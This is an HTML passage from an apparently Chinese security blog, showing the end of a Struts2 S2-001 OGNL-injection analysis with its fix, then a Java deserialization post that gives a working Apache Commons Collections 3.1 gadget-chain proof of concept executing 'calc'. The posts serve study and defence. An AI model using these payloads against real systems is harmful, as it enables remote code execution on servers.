class="line">            while(start != -1 &amp;&amp; x &lt; length &amp;&amp; count != 0) &#123;</span><br><span class="line">                char c = expression.charAt(x++);</span><br><span class="line">                if (c == &apos;&#123;&apos;) &#123;</span><br><span class="line">                    ++count;</span><br><span class="line">                &#125; else if (c == &apos;&#125;&apos;) &#123;</span><br><span class="line">                    --count;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            int end = x - 1;</span><br><span class="line">            if (start == -1 || end == -1 || count != 0) &#123;</span><br><span class="line">                return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String var = expression.substring(start + 2, end);</span><br><span class="line">            Object o = stack.findValue(var, asType);</span><br><span class="line">            if (evaluator != null) &#123;</span><br><span class="line">                o = evaluator.evaluate(o);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String left = expression.substring(0, start);</span><br><span class="line">            String right = expression.substring(end + 1);</span><br><span class="line">            if (o != null) &#123;</span><br><span class="line">                if (TextUtils.stringSet(left)) &#123;</span><br><span class="line">                    result = left + o;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    result = o;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (TextUtils.stringSet(right)) &#123;</span><br><span class="line">                    result = result + right;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                expression = left + o + right;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                result = left + right;</span><br><span class="line">                expression = left + right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>每次循环时的expression表达式都不同，我们开启debug模式，在35行下一断点，按F9，循环expression直到其值为username时 我们开始分析<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-28.20.32.48-image.png" alt="2019-03-28.20.32.48-image.png"></p>
<p>经过两次<br><code>return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);</code><br>expression变为了<code>%{username}</code></p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-28.16.52.55-image.png" alt="2019-03-28.16.52.55-image.png"></p>
<p>经过while循环，跳过return的判断条件，截取expression字符串<code>(username)</code>赋值给var<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-28.16.54.50-image.png" alt="2019-03-28.16.54.50-image.png"></p>
<p>跟进<code>findValue()</code> 返回了我们的payload:<code>%{1+1}</code><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-28.17.01.58-image.png" alt="2019-03-28.17.01.58-image.png"></p>
<p>经过几步操作，进入了下一轮循环，expression的值为<code>${1+1}</code><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-28.17.03.55-image.png" alt="2019-03-28.17.03.55-image.png"></p>
<p><code>findValue</code>再次解析了这个<code>${1+1}</code>这个OGNL表达式，并将其结果<code>2</code>赋值给了变量o<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-28.17.05.09-image.png" alt="2019-03-28.17.05.09-image.png"></p>
<p>expression的值为2，新的循环开始，由于2不是ONGL表达式，进入return语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);</span><br></pre></td></tr></table></figure></p>
<p>最后循环完毕后将2返回给表单。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结其原因是在<code>translateVariables</code>中，递归解析了表达式，在处理完<code>%{username}</code>后将<code>username</code>的值直接取出并继续在while循环中解析，若用户输入的是恶意的OGNL表达式 <code>%{1+1}</code>，则会将其解析执行并将结果2返回至前端。    </p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>根据总结中说的，我们不要让其递归解析即可解决这个问题。<br>官方修复前后代码:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-28.21.19.39-image.png" alt="2019-03-28.21.19.39-image.png"><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-28.21.20.43-image.png" alt="2019-03-28.21.20.43-image.png"></p>
<p><strong>测试修复后逻辑</strong>    </p>
<blockquote>
<p>当解析完一层表达式后，会执行break，不再执行其中插入的表达式，即可解决                </p>
</blockquote>
<p>我们将struts2-core的版本号改为2.0.9<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-29.09.28.19-image.png" alt="2019-03-29.09.28.19-image.png"><br>重新下断点，测试。当解析完<code>%{username}</code>后，执行到:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pos = (left != null &amp;&amp; left.length() &gt; 0 ? left.length() - 1 : 0) + (middle != null &amp;&amp; middle.length() &gt; 0 ? middle.length() - 1 : 0) + 1;</span><br></pre></td></tr></table></figure></p>
<p>pos的值为我们传入的payload(<code>%{1+1}</code>)的长度,重新进入while循环，expression为<code>%{1+1}</code>,执行到:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int start = expression.indexOf(open + &quot;&#123;&quot;, pos);</span><br></pre></td></tr></table></figure></p>
<p>因为pos为payload的长度，所以start值恒为-1，执行到:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (loopCount &gt; maxLoopCount) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></p>
<p>执行break，不再解析%{1+1}</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/2044#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/2044#toc-1</a><br><a href="http://www.zerokeeper.com/vul-analysis/struts2-command-execution-series-review.html" target="_blank" rel="noopener">http://www.zerokeeper.com/vul-analysis/struts2-command-execution-series-review.html</a><br><a href="https://www.kingkk.com/2018/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0struts2-S2-001" target="_blank" rel="noopener">https://www.kingkk.com/2018/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0struts2-S2-001</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/28/Java反序列化/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/02/28/Java反序列化/" itemprop="url">Java序列化与反序列化漏洞</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-28T08:15:41+08:00">
                2019-02-28
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><blockquote>
<p>Java序列化是指把Java对象转化为字节序列的过程便于保存在内存，文件，数据库种，ObjectOutputStream类的writeObject()方法可以实现序列化<br>Java反序列化是指把字节序列恢复为Java对象的过程，ObjectInputStream类的readObject()方法用于反序列化            </p>
</blockquote>
<p>实现简单的序列化与反序列化</p>
<p>一个简单的User类(只有实现了Serializable接口的类的对象才可以被序列化)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class User implements Serializable &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private String pwd;</span><br><span class="line">    </span><br><span class="line">    getter and setter...</span><br></pre></td></tr></table></figure></p>
<p>序列化:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User user = new User();</span><br><span class="line">FileOutputStream fileout = new FileOutputStream(&quot;test.bin&quot;);</span><br><span class="line">ObjectOutputStream out = new ObjectOutputStream(fileout);</span><br><span class="line">out.writeObject(user);</span><br><span class="line">out.close();</span><br><span class="line">fileout.close();</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-25.22.30.02-image.png" alt="2019-03-25.22.30.02-image.png"></p>
<ul>
<li>0xaced 魔术头</li>
<li>0x0005 版本号<br>开头的几位可当作Java序列化得到字节的特征。        </li>
</ul>
<p>反序列化<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FileInputStream fileinput = new FileInputStream(&quot;test.bin&quot;);</span><br><span class="line">ObjectInputStream input = new ObjectInputStream(fileinput);</span><br><span class="line">User user = (User) input.readObject();</span><br><span class="line">input.close();</span><br><span class="line">fileinput.close();</span><br><span class="line">System.out.println(user);    // User@8db2f2</span><br></pre></td></tr></table></figure></p>
<h2 id="Apache-CommonsCollections-序列化RCE漏洞分析"><a href="#Apache-CommonsCollections-序列化RCE漏洞分析" class="headerlink" title="Apache-CommonsCollections 序列化RCE漏洞分析"></a>Apache-CommonsCollections 序列化RCE漏洞分析</h2><blockquote>
<p>该漏洞的问题主要出现在org.apache.commons.collections.Transformer接口上。在Apache commons.collections中有一个InvokerTransformer实现了Transformer接口，主要作用为调用Java的反射机制来调用任意函数。TransformedMap配合AnnotationInvocationHandler中的readObject()，可以触发漏洞，造成命令执行。</p>
</blockquote>
<p>漏洞触发流程:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-27.15.23.02-image.png" alt="2019-03-27.15.23.02-image.png"></p>
<p>调用链:</p>
<blockquote>
<p>InvokerTransformer.transform()-&gt;TransformedMap.checkSetValue()-&gt;AbstractInputCheckedMapDecorator.setValue()-&gt;AnnotationInvocationHandler.readObject()</p>
</blockquote>
<p>技术细节:</p>
<blockquote>
<p>(1)java方法重写：如果一个类的方法被重写，那么在调用时优先调用该方法<br>(2)JAVA反射机制：在运行状态中<br>对于任意一个类，都能够判断一个对象所属的类；<br>对于任意一个类，都能够知道这个类的所有属性和方法；<br>对于任意一个对象，都能够调用它的任意一个方法和属性；<br>(3)认识关键类与函数<br>    TransformedMap ：利用其value修改时触发transform()的特性<br>    ChainedTransformer： 会挨个执行我们定义的Transformer<br>    Transformer: 存放我们要执行的命令<br>    AnnotationInvocationHandler：对memberValues的每一项调用了setValue()函数            </p>
</blockquote>
<p><strong>环境基于:<a href="https://www.oracle.com/technetwork/java/javasebusiness/downloads/java-archive-downloads-javase6-419409.html" target="_blank" rel="noopener">jdk-6u45</a>与<a href="https://mvnrepository.com/artifact/commons-collections/commons-collections" target="_blank" rel="noopener">commons-collections 3.1</a></strong></p>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        GeneratePayload(Reverse_Payload(),&quot;obj&quot;);</span><br><span class="line">        payloadTest(&quot;obj&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object Reverse_Payload() throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                //ConstantTransformer类的transform()方法：将待转化的对象变为一个常量</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line"></span><br><span class="line">                //InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)</span><br><span class="line">                //当改变value时 触发InvokerTransformer的transformer方法</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123; Object.class,</span><br><span class="line">                        Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;,</span><br><span class="line">                        new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = new HashMap();</span><br><span class="line">        map.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        Map outmap = TransformedMap.decorate(map, null, transformerChain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        //通过反射获得AnnotationInvocationHandler类对象</span><br><span class="line">        Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        //通过反射获得cls的构造函数</span><br><span class="line">        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        //这里需要设置Accessible为true，否则序列化失败</span><br><span class="line">        ctor.setAccessible(true);</span><br><span class="line">        //通过newInstance()方法实例化对象</span><br><span class="line">        Object o = ctor.newInstance(Retention.class, outmap);</span><br><span class="line">        return o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void GeneratePayload(Object instance, String file)</span><br><span class="line">            throws Exception &#123;</span><br><span class="line">        //将构造好的payload序列化后写入文件中</span><br><span class="line">        File f = new File(file);</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void payloadTest(String file) throws Exception &#123;</span><br><span class="line">        //取出文件中的payload，进行反序列化</span><br><span class="line">        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<hr>
<p>我们先分析下poc中用到的各个类</p>
<blockquote>
<p><strong>TransformedMap</strong></p>
</blockquote>
<p>Map类是存储键值对的数据结构，Apache Commons Collections实现了TransformedMap，用来对Map进行变换，该类在一个元素(key或value)被添加/删除/修改时就会调用相应的transform方法对其进行修饰变换，具体的变换逻辑在transform方法中实现。<strong>如我们在transform方法中定义value++，当TransformedMap类中的value被修改时，就会调用transform方法，其value值先加1</strong><br>我们可以通过decorate方法获得一个TransformedMap实例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map outmap = TransformedMap.decorate(map, null, transformerChain);</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>TransformedMap.decorate()：<br>public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {<br>    return new TransformedMap(map, keyTransformer, valueTransformer);<br>}<br>第一个参数为待转化的Map对象<br>第二个参数为Map对象的key要经过的转化方法（单个方法或方法链或null）<br>第三个参数为Map对象的Value要经过的转化方法（单个方法或方法链或null）</p>
</blockquote>
<p>当Map中任一项的Key或Value被修改，相应的Transform方法就会被调用。</p>
<p>分析漏洞需要用到Apache Commons Collections中几个已经实现了Transformer的类:</p>
<blockquote>
<p><strong>ConstantTransformer()</strong></p>
</blockquote>
<p>该类的transformer方法会返回构造函数传入的参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public ConstantTransformer(Object constantToReturn) &#123;</span><br><span class="line">        this.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">public Object transform(Object input) &#123;</span><br><span class="line">    return this.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>InvokerTransformer</strong></p>
</blockquote>
<p>该类的transform方法通过Java的反射机制执行任意代码。transform方法用到的方法名，参数类型与参数值都在类的构造函数中指定</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span><br><span class="line">    this.iMethodName = methodName;</span><br><span class="line">    this.iParamTypes = paramTypes;</span><br><span class="line">    this.iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public Object transform(Object input) &#123;</span><br><span class="line">    if (input == null) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(this.iMethodName, this.iParamTypes);</span><br><span class="line">            return method.invoke(input, this.iArgs);</span><br><span class="line">        &#125; catch (NoSuchMethodException var5) &#123;</span><br><span class="line">            throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; does not exist&quot;);</span><br><span class="line">        &#125; catch (IllegalAccessException var6) &#123;</span><br><span class="line">            throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; cannot be accessed&quot;);</span><br><span class="line">        &#125; catch (InvocationTargetException var7) &#123;</span><br><span class="line">            throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; threw an exception&quot;, var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>ChainedTransformer</strong></p>
</blockquote>
<p><strong>构造方法</strong>：会将传进来的Transformer数组保存为this.iTransformers对象。<br><strong>transform()</strong>：依次调用this.iTransformers对象的transformer方法，且前一次执行transform方法的返回值object，会作为下一次执行transform方法的参数object</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public ChainedTransformer(Transformer[] transformers) &#123;</span><br><span class="line">    this.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public Object transform(Object object) &#123;</span><br><span class="line">    for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = this.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    return object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>构造触发链:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">        //ConstantTransformer类的transform()方法：将待转化的对象变为一个常量</span><br><span class="line">        new ConstantTransformer(Runtime.class),</span><br><span class="line"></span><br><span class="line">        //InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)</span><br><span class="line">        //当改变value时 触发InvokerTransformer的transformer方法</span><br><span class="line">        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;</span><br><span class="line">                String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123; Object.class,</span><br><span class="line">                Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;,</span><br><span class="line">                new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-27.14.24.07-image.png" alt="2019-03-27.14.24.07-image.png"><br>这里的情况是<strong>只允许调用Class.getMethod与Method.invoke方法去执行命令</strong><br>触发链执行步骤:</p>
<blockquote>
<ul>
<li>构造一个ConstantTransformer，传入Runtime的class对象，在执行transform()时，会始终返回这个对象</li>
<li>构造一个InvokerTransformer，待调用方法名为getMethod，参数为getRuntime。transform时 传入1的结果，input为java.lang.Runtime cls为java.lang.Class。待调用方法为getMethod，然后invoke调用这个放过发最终得到的是    Runtime对象</li>
<li>构造一个InvokerTransformer，待调用方法为invoke，参数为null，在transform时，传入2的结果，实际上是调用getRuntime()拿到Runtime对象</li>
<li>构造一个InvokerTransformer，待调用方法为exec，参数为执行的命令clac，在transform时，传入3的结果，获取java.lang.Runtime的exec方法并传参调用</li>
<li>最后将其放入一个数组，传入ChainedTransformer中，在transform时，会将前一个元素的返回结果作为下一个的参数，满足我们的需求。</li>
</ul>
</blockquote>
<p>我们思考下使用逻辑更清晰的触发链：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">                new InvokerTransformer(&quot;getRuntime&quot;, new Class[0], new Object[0]),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;,</span><br><span class="line">                        new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure></p>
<p>但是运行出错，原因是<code>Runtime.getRuntime()</code>得到的<code>java.lang.Runtime</code>对象需要参与序列化过程，但是并没有实现Serializable接口，所以行不通<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-31.18.23.00-image.png" alt="2019-03-31.18.23.00-image.png"><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-31.18.23.29-image.png" alt="2019-03-31.18.23.29-image.png"></p>
<p>上面的触发链相当于执行命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.class.getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;);</span><br></pre></td></tr></table></figure></p>
<p>测试demo:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                //ConstantTransformer类的transform()方法：将待转化的对象变为一个常量</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line"></span><br><span class="line">                //InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)</span><br><span class="line">                //当改变value时 触发InvokerTransformer的transformer方法</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123; Object.class,</span><br><span class="line">                        Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;,</span><br><span class="line">                        new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        //transformers数组 ChainedTransformer按顺序调用一系列的变换</span><br><span class="line">        Transformer transformedChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map normalMap = new HashMap();</span><br><span class="line">        normalMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line"></span><br><span class="line">        //TransformedMap(map, keyTransformer, valueTransformer)</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(normalMap, null, transformedChain);</span><br><span class="line">        Map.Entry entry = (Map.Entry) transformedMap.entrySet().iterator().next();</span><br><span class="line">        entry.setValue(&quot;1111&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>当执行setValue()后会调用相应的transformedChain链。<br><strong>最终结果</strong>:我们精心构造的TransformedMap，在其任意键值被修改时，触发机制，从而执行命令。</p>
<hr>
<p>接下来的任务就是去找一个包含<strong>可控Map字段，并会在反序列化时对这个Map进行setValue()操作的类</strong>。我们的前辈在<br>Java运行类库中找见AnnotationInvocationHandler类，这个类完美符合我们的要求。传入Map对象，并在重写的readObject方法中对其进行setValue操作。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#jdk1.6.0_45\jre\lib\rt.jar!\sun\reflect\annotation\AnnotationInvocationHandler.class	</span><br><span class="line">class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123;</span><br><span class="line">    private static final long serialVersionUID = 6182022883658399397L;</span><br><span class="line">    private final Class type;</span><br><span class="line">    private final Map&lt;String, Object&gt; memberValues;</span><br><span class="line">    private transient volatile Method[] memberMethods = null;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        this.type = var1;</span><br><span class="line">        this.memberValues = var2;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    private void readObject(ObjectInputStream var1) throws IOException, 